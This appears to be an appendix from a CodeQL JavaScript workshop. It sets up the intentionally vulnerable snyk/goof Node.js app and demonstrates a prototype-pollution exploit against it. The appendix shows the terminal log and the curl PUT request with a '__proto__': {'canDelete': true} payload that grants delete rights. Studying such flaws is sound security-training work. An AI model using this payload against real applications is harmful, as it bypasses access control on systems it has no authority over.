javascript/codeql-js-goof-workshop/workshop.org
** Appendix E: Complete Setup and Exploit of the snyk/goof Application
   This is a concise setup and run of [[https://github.com/snyk/goof][snyk/goof]].  All steps are included for
   completeness, but for the workshop we only need to collect the vulnerability
   information.

   1. Install [[https://docs.mongodb.com/manual/tutorial/install-mongodb-on-os-x/#install-mongodb-community-edition][mongodb]]
      #+BEGIN_SRC sh
        # Install
        brew tap mongodb/brew
        brew install mongodb-community@4.4
      #+END_SRC
      To have launchd start mongodb/brew/mongodb-community now and restart at login:
      : brew services start mongodb/brew/mongodb-community
      Or, if you don't want/need a background service you can just run:
      : mongod --config /usr/local/etc/mongod.conf

      Which is what we do:
      #+BEGIN_SRC sh
        # Run
        mongod --config /usr/local/etc/mongod.conf &

        # check log
        tail /usr/local/var/log/mongodb/mongo.log

        # Connect and test
        mongo

        db.inventory.insertOne(
           { item: "canvas", qty: 100, tags: ["cotton"], size: { h: 28, w: 35.5, uom: "cm" } }
        )

        db.inventory.find( { item: "canvas" } )
      #+END_SRC

   2. Install goof
      #+BEGIN_SRC sh
        # Clone
        cd ~/local
        git clone https://github.com/Snyk/goof

        # Build
        cd ~/local/goof
        npm install

        # ...
        # found 253 vulnerabilities (153 low, 17 moderate, 82 high, 1 critical)
        #   run `npm audit fix` to fix them, or `npm audit` for details
        # ...
      #+END_SRC

   3. Run goof
      #+BEGIN_SRC sh
        # Run mongodb
        mongod --config /usr/local/etc/mongod.conf &

        # Run goof
        cd ~/local/goof
        npm start                       # follow logs here
        # or
        node app.js                     # from ~/local/goof/package.json
        open http://localhost:3001
      #+END_SRC

   4. Try prototype-pollution exploits
      #+BEGIN_SRC sh
        # Check exploits
        bash
        . ~/local/goof/exploits/prototype-pollution.sh

        # Try c1 through c4 and exploit:
        List messages
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c1
                []

        Send some messages
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c2
                {"ok":true}
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c2
                {"ok":true}

        List again
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c1
                [{"icon":"👋","text":"Hi!","id":1,"timestamp":1602276330967,"userName":"user"},
                 {"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"}]

        Try to delete
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c4
                {"ok":false,"error":"Access denied"}

        Use exploit
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c3
                {"ok":true}

        Try to delete again
                hohn@gh-hohn ~/local/goof/exploits
                130:$ c4
                {"ok":true}

        Notice message 1 is gone:
                hohn@gh-hohn ~/local/goof/exploits
                0:$ c1
                [{"icon":"👋","text":"Hi!","id":2,"timestamp":1602276331875,"userName":"user"},
                 {"icon":"👋","text":"😈","id":3,"timestamp":1602276340962,"userName":"user"}]
      #+END_SRC

   5. The exploit's origin, or "What happened?"

      The requests sent are
      #+BEGIN_SRC sh
        // c2, safe
        {
            curl --request PUT \
              --url "$GOOF_HOST/chat" \
              --header 'content-type: application/json' \
              --data '{"auth": {"name": "user", "password": "pwd"}, "message": {"text": "Hi!"}}'
        }
        // c3, the exploit:
        {
            curl --request PUT \
              --url "$GOOF_HOST/chat" \
              --header 'content-type: application/json' \
              --data '{"auth": {"name": "user", "password": "pwd"}, 
                       "message": { "text": "😈", "__proto__": {"canDelete": true}}}'
        }
      #+END_SRC

      Both are PUT requests to the URL =$GOOF_HOST/chat=, but the json messages differ:
      #+BEGIN_SRC javascript
        // safe
        {"auth": {"name": "user", "password": "pwd"}, 
         "message": {"text": "Hi!"}}

        // exploit
        {"auth": {"name": "user", "password": "pwd"}, 
         "message": { "text": "😈", "__proto__": {"canDelete": true}}}
      #+END_SRC




#+HTML: </div> 

